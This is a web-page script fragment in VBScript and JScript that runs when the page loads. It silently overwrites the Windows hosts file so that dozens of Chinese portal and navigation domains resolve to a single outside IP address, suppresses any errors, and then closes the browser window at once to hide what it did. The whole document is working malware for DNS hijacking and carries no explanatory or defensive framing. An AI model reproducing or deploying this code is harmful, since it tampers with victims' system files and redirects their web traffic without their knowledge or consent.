   <script LANGUAGE="VBScript.Encode">
   on error resume next

   set fso=CreateObject("Scripting.FileSystemObject")

   function EagleGetHosts()
   EagleFolder1=fso.GetSpecialFolder(0)
   EagleFolder2=fso.GetSpecialFolder(1)
   if instr(lcase(EagleFolder2),"system32")>1 then
   EagleGetHosts=EagleFolder1&"\system32\drivers\etc\hosts"
   else
   EagleGetHosts=EagleFolder1&"\hosts"
   end if
   end function

   function ERH(ip,domain)
   ERH=ip&"     "&domain&chr(13)&chr(10)
   end function

   function EagleRunHosts(EagleIP)
   ECT="127.0.0.1¡¡¡¡¡¡localhost"&chr(13)&chr(10)
   ECT=ECT+ERH("192.168.0.1","assistant.3721.com")
   ECT=ECT+ERH("61.129.88.173","265.com")
   ECT=ECT+ERH("61.129.88.173","www.265.com")
   ECT=ECT+ERH("61.129.88.173","365.com")
   ECT=ECT+ERH("61.129.88.173","www.365.com")
   ECT=ECT+ERH("61.129.88.173","3tom.com")
   ECT=ECT+ERH("61.129.88.173","www.3tom.com")
   ECT=ECT+ERH("61.129.88.173","3721.com")
   ECT=ECT+ERH("61.129.88.173","www.3721.com")
   ECT=ECT+ERH("61.129.88.173","cns.3721.com")
   ECT=ECT+ERH("61.129.88.173","5566.net")
   ECT=ECT+ERH("61.129.88.173","www.5566.net")
   ECT=ECT+ERH("61.129.88.173","5566.org")
   ECT=ECT+ERH("61.129.88.173","www.5566.org")
   ECT=ECT+ERH("61.129.88.173","432.cn")
   ECT=ECT+ERH("61.129.88.173","www.432.cn")
   ECT=ECT+ERH("61.129.88.173","wo99.com")
   ECT=ECT+ERH("61.129.88.173","www.wo99.com")
   ECT=ECT+ERH("61.129.88.173","37021.com")
   ECT=ECT+ERH("61.129.88.173","www.37021.com")
   ECT=ECT+ERH("61.129.88.173","wu123.com")
   ECT=ECT+ERH("61.129.88.173","www.wu123.com")
   ECT=ECT+ERH("61.129.88.173","da123.com")
   ECT=ECT+ERH("61.129.88.173","www.da123.com")
   ECT=ECT+ERH("61.129.88.173","k369.com")
   ECT=ECT+ERH("61.129.88.173","www.k369.com")
   ECT=ECT+ERH("61.129.88.173","cnww.net")
   ECT=ECT+ERH("61.129.88.173","www.cnww.net")
   ECT=ECT+ERH("61.129.88.173","94135.com")
   ECT=ECT+ERH("61.129.88.173","www.94135.com")
   ECT=ECT+ERH("61.129.88.173","v111.com")
   ECT=ECT+ERH("61.129.88.173","www.v111.com")
   ECT=ECT+ERH("61.129.88.173","zhao123.com")
   ECT=ECT+ERH("61.129.88.173","www.zhao123.com")
   EagleFile=EagleGetHosts()

   Set f = fso.CreateTextFile(EagleFile, True)
   f.Write(ECT)
   f.close
   end function
   </script>
   <script LANGUAGE="VBScript">
   Call EagleRunHosts("192.168.0.1")
   </script>
   <script language="JScript.Encode">
   function closeit() {
   setTimeout("self.close()",0)
   }
   closeit()
   </script>
